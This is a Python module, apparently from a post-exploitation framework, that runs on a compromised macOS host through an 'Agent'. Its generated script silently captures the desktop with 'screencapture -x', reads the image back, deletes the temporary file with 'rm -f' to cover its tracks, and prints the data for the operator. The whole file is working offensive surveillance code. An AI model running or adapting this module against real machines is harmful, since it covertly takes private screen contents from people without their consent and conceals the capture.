class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Screenshot',
            'Author': ['@harmj0y'],
            'Description': ('Takes a screenshot of an OSX desktop using screencapture and returns the data.'),
            'Background': False,
            'OutputExtension': "png",
            'NeedsAdmin': False,
            'OpsecSafe': False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': []
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SavePath': {
                'Description'   :   'Path of the temporary screenshot file to save.',
                'Required'      :   True,
                'Value'         :   '/tmp/out.png'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        savePath = self.options['SavePath']['Value']
        script = """
run_command('screencapture -x %s')
f = open('%s', 'rb')
data = f.read()
f.close()
run_command('rm -f %s')
print data
""" % (savePath, savePath, savePath)
        return script